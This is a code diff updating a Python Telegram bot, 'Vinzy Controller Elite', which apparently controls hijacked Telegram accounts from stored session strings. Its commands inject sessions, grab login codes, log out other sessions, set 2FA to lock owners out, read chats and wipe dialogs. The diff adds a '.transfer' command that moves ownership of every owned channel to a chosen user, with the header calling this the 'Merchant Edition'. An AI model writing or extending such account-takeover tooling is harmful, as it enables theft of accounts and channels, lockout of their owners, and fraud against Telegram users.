@@ -1,5 +1,5 @@
 # =========================================================================
-# PROJECT: VINZY CONTROLLER ELITE (V4.5 - THE ULTIMATE OVERSEER)
+# PROJECT: VINZY CONTROLLER ELITE (V4.6 - THE MERCHANT EDITION)
 # AUTHOR: VINZY DIGITAL SERVICES
 # DESCRIPTION: ENTERPRISE-GRADE TELEGRAM SESSION MANAGEMENT & CONTROL
 # PLATFORM: PYTHON 3.10+ | TELETHON | PYTELEGRAMBOTAPI | NEON POSTGRES
@@ -46,6 +46,8 @@ bot = telebot.TeleBot(BOT_TOKEN)
 # --- 3. PERSISTENT STORAGE LAYER (POSTGRESQL) ---
 
 class VaultManager:
+    """Handles high-performance database operations for session storage."""
+    
     @staticmethod
     def get_connection():
         try:
@@ -126,6 +128,7 @@ class VaultManager:
 # --- 4. ASYNC TASK ENGINE (TELETHON WRAPPER) ---
 
 async def run_logic(phone, callback, *args):
+    """Execution wrapper for all commands with spoofed iPhone 15 Pro Max data."""
     session_str = VaultManager.get_session(phone)
     if not session_str:
         return f"❌ <b>Error:</b> Account <code>{phone}</code> is not in the vault."
@@ -237,6 +240,7 @@ async def logic_read_msgs(client, cid, limit):
         return f"⚠️ Failed to read {cid}: {str(e)}"
 
 async def logic_clean_account(client):
+    """Purges DMs, Groups, and Non-Owned Channels."""
     count = 0
     protected = 0
     async for dialog in client.iter_dialogs():
@@ -262,13 +266,29 @@ async def logic_clean_account(client):
         except: continue
     return f"🧹 <b>Atomic Wipe Complete:</b> Purged <code>{count}</code> items. Protected <code>{protected}</code> Admin channels."
 
+async def logic_transfer_channels(client, target_username):
+    """Transfers ownership of all owned channels to target."""
+    try:
+        target_entity = await client.get_input_entity(target_username)
+        count = 0
+        async for dialog in client.iter_dialogs():
+            if dialog.is_channel:
+                try:
+                    p = await client(functions.channels.GetParticipantRequest(channel=dialog.input_entity, participant='me'))
+                    if isinstance(p.participant, tl_types.ChannelParticipantCreator):
+                        await client(functions.channels.EditCreatorRequest(channel=dialog.input_entity, user_id=target_entity, password=''))
+                        count += 1
+                except: continue
+        return f"✅ <b>Success:</b> Transferred <code>{count}</code> channels to @{target_username}."
+    except Exception as e: return f"❌ <b>Transfer Error:</b> {str(e)}"
+
 # --- 6. TELEGRAM BOT HANDLERS ---
 
 @bot.message_handler(commands=['start', 'help'])
 def handle_help(m):
     if m.chat.id != GROUP_ID: return
     text = (
-        "👑 <b>VINZY CONTROLLER ELITE V4.5</b>\n"
+        "👑 <b>VINZY CONTROLLER ELITE V4.6</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         "🔌 <b>ACCESS</b>\n"
         "• <code>.auth [session]</code> - Inject session\n"
@@ -278,8 +298,9 @@ def handle_help(m):
         "• <code>.lock [phone]</code> - 2FA status\n"
         "• <code>.wipe [phone]</code> - Logout others\n"
         "• <code>.secure [phone] [pw]</code> - Set 2FA\n\n"
-        "☢️ <b>PURGE</b>\n"
-        "• <code>.clean [phone]</code> - Atomic Wipe (DMs/Groups/Non-Admin Channels)\n\n"
+        "☢️ <b>PURGE & TRADE</b>\n"
+        "• <code>.clean [phone]</code> - Atomic Wipe\n"
+        "• <code>.transfer [phone] [user]</code> - Give ownership\n\n"
         "🕵️ <b>DISCOVERY</b>\n"
         "• <code>.code [phone]</code> - Get code\n"
         "• <code>.chats [phone] [limit]</code> - List dialogs\n"
@@ -329,6 +350,15 @@ def cmd_clean(m):
     if len(args) < 2: return
     bot.send_message(m.chat.id, f"☢️ <b>Atomic Wipe Initiated for +{args[1]}...</b>")
     res = asyncio.run(run_logic(args[1], logic_clean_account))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text.startswith('.transfer'))
+def cmd_transfer(m):
+    if m.chat.id != GROUP_ID: return
+    parts = m.text.split()
+    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.transfer [phone] [target_user]</code>")
+    bot.send_message(m.chat.id, f"🚀 <b>Transferring Owned Channels to @{parts[2]}...</b>")
+    res = asyncio.run(run_logic(parts[1], logic_transfer_channels, parts[2]))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.text.startswith('.code'))
@@ -381,11 +411,12 @@ def main():
                        |___/                          
     """)
     VaultManager.initialize_db()
-    logger.info("Vinzy Controller Elite v4.5 is online.")
+    logger.info("Vinzy Controller Elite v4.6 Online.")
     while True:
         try:
             bot.polling(none_stop=True, interval=0, timeout=20)
-        except:
+        except Exception as e:
+            logger.error(f"Polling error: {e}")
             time.sleep(5)
 
 if __name__ == "__main__":
